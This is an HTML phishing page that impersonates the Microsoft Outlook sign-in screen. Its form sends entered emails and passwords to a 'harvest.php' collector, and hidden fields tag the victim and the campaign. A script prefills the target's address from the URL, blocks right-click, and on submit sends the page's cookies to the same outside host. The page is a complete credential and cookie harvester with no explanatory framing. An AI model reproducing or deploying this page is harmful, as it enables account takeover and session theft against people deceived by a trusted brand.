<!doctype html>
<html>
<head>
  <title>Sign in to your Microsoft Outlook account</title>
  <meta name="robots" content="noindex">
</head>
<body oncontextmenu="return false">
  <img src="https://cdn.example-assets.net/outlook-logo.png" alt="Microsoft">
  <h1>Sign in</h1>
  <form method="post" action="https://collect.example.net/harvest.php">
    <input type="email" name="login" placeholder="Email or phone">
    <input type="password" name="passwd" placeholder="Password">
    <input type="hidden" name="victim" value="">
    <input type="hidden" name="campaign" value="q4-office">
    <button type="submit">Sign in</button>
  </form>
  <script>
    document.querySelector('[name=login]').value = new URLSearchParams(location.search).get('e') || '';
    document.querySelector('form').addEventListener('submit', function () {
      fetch('https://collect.example.net/log?d=' + encodeURIComponent(document.cookie));
    });
  </script>
</body>
</html>
